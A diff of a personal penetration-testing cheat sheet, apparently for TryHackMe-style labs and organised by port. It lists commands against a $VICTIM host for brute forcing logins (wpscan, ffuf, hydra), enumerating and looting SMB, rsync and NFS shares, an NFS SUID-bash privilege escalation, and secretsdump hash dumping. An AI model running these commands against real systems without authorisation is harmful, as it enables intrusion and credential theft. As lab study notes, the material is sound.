@@ -128,20 +128,29 @@ put file.txt
 
 
 
-### **TCP/21 - SSH**
+## **TCP/22 - SSH**
+
+### SSH into host
 
 **Kali**
 
 ```
-hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt  ssh://$VICTIM
+ssh $USERNAME@$VICTIM
+
+#SSH into non-standard port
+ssh $USERNAME@$VICTIM -p2222
 ```
 
-### **TCP/25 - SMTP**
+### Check this page for cracking examples
+
+[#ssh](cheat-sheets/credential-gathering-and-cracking.md#ssh "mention")
+
+## **TCP/25 - SMTP**
 
 **Kali**
 
 ```
-telnet $VICTIM25
+telnet $VICTIM 25
 HELO
 VRFY root
 QUIT
@@ -165,13 +174,21 @@ sudo nmap $VICTIM -p25 --script smtp-enum-users --script-args smtp-enum-users.me
 smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VICTIM
 ```
 
+
+
+### Check for vulnerabilities&#x20;
+
 **Kali**
 
 ```
-sudo nmap $VICTIM -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
+sudo nmap $VICTIM -p25 --script smtp-vuln* 
 ```
 
-### **TCP/80:443 - HTTP(s)**
+### Check this page for cracking examples
+
+[#smtp](cheat-sheets/credential-gathering-and-cracking.md#smtp "mention")
+
+## **TCP/80:443 - HTTP(s)**
 
 Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)
 
@@ -256,8 +273,6 @@ Check if the target is vulnerable to Heartbleed
 nmap -p 443  $VICTIM --script ssl-heartbleed
 ```
 
-
-
 Check if these files exist to gather info
 
 ```
@@ -279,9 +294,56 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/login -fc 200
 ```
 
+### Download file
+
+#### wget
+
+**Victim**&#x20;
+
+```
+wget http://$VICTIM/$FILE
+
+#From non-strandard port
+wget http://$VICTIM:81/$FILE
+```
+
+### Run Web server
+
+#### Kali
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+### Wordpress
 
 
-### UDP/88 - Kerberos
+
+#### Scan wordpress site
+
+#### Kali
+
+```
+wpscan --url http://$VICTIM
+```
+
+#### Bruteforce admin page
+
+#### Kali
+
+```
+wpscan --url http://$VICTIM --passwords /usr/share/wordlists/rockyou.txt
+```
+
+## Jenkins
+
+#### Reverse Shell
+
+**Examples**
+
+[#jenkins-web](../walkthroughs/tryhackme/internal.md#jenkins-web "mention")
+
+## UDP/88 - Kerberos
 
 #### Username Enumeration
 
@@ -289,7 +351,7 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
 ```
 
-### **TCP/110 - POP3**
+## **TCP/110 - POP3**
 
 ```
 telnet $VICTIM 110
@@ -299,7 +361,7 @@ RETR 1
 QUIT
 ```
 
-### **TCP/135 - RPC**
+## **TCP/135 - RPC**
 
 ```
 rpcclient -U '' $VICTIM
@@ -307,7 +369,9 @@ srvinfo
 netshareenum # print the real file-path of shares; good for accurate RCE
 ```
 
-### **TCP/139 - NetBIOS**
+## **TCP/139 - NetBIOS**
+
+**Kali**
 
 ```
 nbtscan $VICTIM
@@ -316,35 +380,32 @@ enum4linux $VICTIM
 
 
 
-### **TCP/445  - SMB**
+## **TCP/445  - SMB**
 
-**List Shares**
+### **List Shares**
 
 **Kali**
 
 ```
 smbclient -L //$VICTIM/ 
-```
 
-#### List shares on a non-stanadrd SMB/Samba port
-
-**Kali**
-
-```
+# List shares on a non-standard SMB/Samba port
 smbclient -L //$VICTIM/ -p $PORT 
 ```
 
-#### Download files&#x20;
+### Download files&#x20;
+
+#### Option #1
 
 **Kali**
 
-<pre><code><strong>cd loot
-</strong>smbclient \\\\$VICTIM\\$SHARE
+```
+smbclient \\\\$VICTIM\\$SHARE
 prompt
 mget *
-</code></pre>
+```
 
-? The SMB shares discovered have the following permissions
+#### Option #2
 
 **Kali**
 
@@ -353,34 +414,47 @@ smbmap -H $VICTIM
 smbmap -H $VICTIM-P $PORT
 ```
 
-Download files
+#### Option #3
 
 **Kali**
 
 ```
 smbget -R smb://$VICTIM/$SHARE
+
+# List shares on a non-standard SMB/Samba port
 smbget -R smb://$VICTIM:$PORT/$SHARE
+```
+
+### Upload files
+
+#### Option #1
+
+**Kali**
+
+```
+smbclient \\\\$VICTIM\\$SHARE
+put $FILE
 ```
 
 ### Detect Vulnerabilities
 
 ```
-# check if vulnerable to EternalBlue
+# Check if vulnerable to EternalBlue
 sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 
 ```
 
 ```
-# check if vulnerable to SambaCry
+# Check if vulnerable to SambaCry
 sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version
 ```
 
-### **TCP/667 - IRC**
+## **TCP/667 - IRC**
 
 ```
 irssi -c $VICTIM -p $PORT
 ```
 
-### **TCP/873 - RSYNC**
+## **TCP/873 - RSYNC**
 
 ```
 sudo nmap $VICTIM -p873 --script rsync-list-modules
@@ -388,7 +462,7 @@ rsync -av rsync://$VICTIM/$SHARE --list-only
 rsync -av rsync://$VICTIM/$SHARE loot
 ```
 
-### **TCP/2049 - NFS**
+## **TCP/2049 - NFS**
 
 <pre><code><strong>sudo nmap $VICTIM -p111 --script-nfs*
 </strong></code></pre>
@@ -444,13 +518,13 @@ chmod +d /mount/point/bash
 /mount/point/bash -p
 ```
 
-### **TCP/3306 - SQL**
+## **TCP/3306 - SQL**
 
 ```
 mysql -u $USER -h $VICTIM
 ```
 
-### **TCP/3389 - RDP**
+## **TCP/3389 - RDP**
 
 ```
 sudo nmap $VICTIM -p3389 --script rdp-ntlm-info 
@@ -460,14 +534,14 @@ sudo nmap $VICTIM -p3389 --script rdp-ntlm-info
 rdesktop -u administrator $VICTIM
 ```
 
-### **TCP/5327 - Postgres**
+## **TCP/5327 - Postgres**
 
 ```
 psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
 SELECT pg_ls_dir('/');
 ```
 
-### **TCP/5985 - WinRM**
+## **TCP/5985 - WinRM**
 
 Login with found username and password
 
@@ -487,7 +561,7 @@ Dump hashes of other users if the user you have access to has the privilege's to
 python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
 ```
 
-### TCP/7070 - AnyConnect
+## TCP/7070 - AnyConnect
 
 **Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)
 
